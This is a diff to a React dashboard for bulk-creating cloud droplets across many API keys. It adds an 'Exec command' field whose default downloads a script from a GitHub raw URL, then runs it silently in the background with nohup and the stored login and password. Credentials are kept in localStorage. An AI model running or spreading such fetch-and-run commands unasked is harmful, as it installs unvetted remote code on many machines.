@@ -30,6 +30,7 @@ function App() {
   const $ta = useRef();
   const $login = useRef();
   const $password = useRef();
+  const $exec = useRef();
   const [state, setState] = useState({
     perf: []
   })
@@ -86,10 +87,10 @@ function App() {
       }
     })
 
-    setState({
-      ...state,
+    setState(prev => ({
+      ...prev,
       [apiKey]: droplets
-    })
+    }))
   }
 
   const getPerf = apiKey => async () => {
@@ -184,8 +185,6 @@ function App() {
 
     np[index] = perf
 
-    console.log(np)
-
     setState({
       ...state,
       perf: {
@@ -203,50 +202,6 @@ function App() {
       headers: {
         'X-Token': apiKey,
       }
-    })
-
-    await getData(apiKey)
-  }
-
-  const createDroplet = apiKey => async () => {
-    if (!window.confirm('are you sure')) {
-      return null
-    }
-
-    const name = prompt("enter name:")
-
-    await getApi(`create/${name}`, {
-      method: 'POST',
-      headers: {
-        'X-Token': apiKey,
-      },
-      body: JSON.stringify({
-        creds,
-      })
-    })
-
-    await getData(apiKey)
-  }
-  const createDroplets = apiKey => async () => {
-    if (!window.confirm('are you sure')) {
-      return null
-    }
-
-    const amount = prompt("amount:")
-    const prefix = prompt("prefix:")
-
-    const names = Array(Number(amount)).fill(1).map((c, x) => `${prefix}${x + 1}`)
-
-    await getApi(`createAll`, {
-      method: 'POST',
-      headers: {
-        'X-Token': apiKey,
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        names,
-        creds,
-      })
     })
 
     await getData(apiKey)
@@ -306,14 +261,12 @@ function App() {
 
     window.localStorage.setItem('keys', JSON.stringify(keys))
     window.localStorage.setItem('creds', JSON.stringify({login, password}))
-    console.log(keys)
 
     let perf = {}
 
     keys.forEach(k => perf[k] = [])
 
     setApiKeys(keys)
-
 
     setCreds({
       login,
@@ -325,6 +278,62 @@ function App() {
     })
 
     getAllData(keys)
+  }
+
+  const getExecCommand = () => {
+    let exec = $exec.current.value.trim();
+
+    exec = exec.replace('{password}', creds.password);
+    exec = exec.replace('{login}', creds.login);
+
+    return exec
+  }
+
+  const createDroplet = apiKey => async () => {
+    if (!window.confirm('are you sure')) {
+      return null
+    }
+
+    const name = prompt("enter name:")
+
+    await getApi(`create/${name}`, {
+      method: 'POST',
+      headers: {
+        'X-Token': apiKey,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        creds,
+        exec: getExecCommand()
+      })
+    })
+
+    await getData(apiKey)
+  }
+  const createDroplets = apiKey => async () => {
+    if (!window.confirm('are you sure')) {
+      return null
+    }
+
+    const amount = prompt("amount:")
+    const prefix = prompt("prefix:")
+
+    const names = Array(Number(amount)).fill(1).map((c, x) => `${prefix}${x + 1}`)
+
+    await getApi(`createAll`, {
+      method: 'POST',
+      headers: {
+        'X-Token': apiKey,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        names,
+        creds,
+        exec: getExecCommand()
+      })
+    })
+
+    await getData(apiKey)
   }
 
   const fillDroplets = apiKey => async () => {
@@ -341,7 +350,8 @@ function App() {
         'Content-Type': 'application/json'
       },
       body: JSON.stringify({
-        creds
+        creds,
+        exec: getExecCommand(),
       })
     })
 
@@ -349,31 +359,36 @@ function App() {
   }
 
   return (
-    <div className='container-fluid'>
+    <div className='container-fluid mt-3'>
       <>
           <div className="row">
             <div className="col-9">
-              <label for="exampleInputEmail1" className="form-label">Api key:</label>
+              <label className="form-label">Api key:</label>
               <textarea ref={$ta} className="form-control mb-1" defaultValue={apiKeys && apiKeys.join('\n')} rows={"4"} cols={"75"}>
               </textarea>
             </div>
             <div className="col-3">
-              <label for="exampleInputEmail1" className="form-label">Login:</label>
+              <label className="form-label">Login:</label>
               <input type="text" ref={$login} className="form-control mb-1" defaultValue={creds.login} />
-              <label for="exampleInputEmail1" className="form-label">Password:</label>
+              <label className="form-label">Password:</label>
               <input type="text" ref={$password} className="form-control mb-1" defaultValue={creds.password} />
             </div>
           </div>
-          <button className="btn btn-primary" onClick={processApiKeys}>Process keys</button>
-
+          <div className="row">
+            <div className="col">
+              <label className="form-label">Exec command:</label>
+              <input type="text" ref={$exec} className="form-control mb-1" defaultValue={`#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &`} />
+            </div>
+          </div>
+          <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
+<hr className='my-4'/>
         {apiKeys.length > 0 && <>
           {apiKeys.map(apiKey => (
             <div className="card mb-2" key={apiKey}>
               <div className="card-body">
                 <h5 className="card-title">{apiKey}</h5>
-
                   <div className="btn-group mb-3">
-                    <button className="btn btn-sm btn-primary" onClick={getPerf(apiKey)}>Get Perf All</button>
+                    <button className="btn btn-sm btn-primary" onClick={getPerf(apiKey)}>Get Performance</button>
                     <button className="btn btn-sm btn-primary" onClick={() => getData(apiKey)}>Refresh</button>
                     <button className="btn btn-sm btn-primary" onClick={createDroplet(apiKey)}>Create</button>
                     <button className="btn btn-sm btn-primary" onClick={createDroplets(apiKey)}>Create droplets</button>
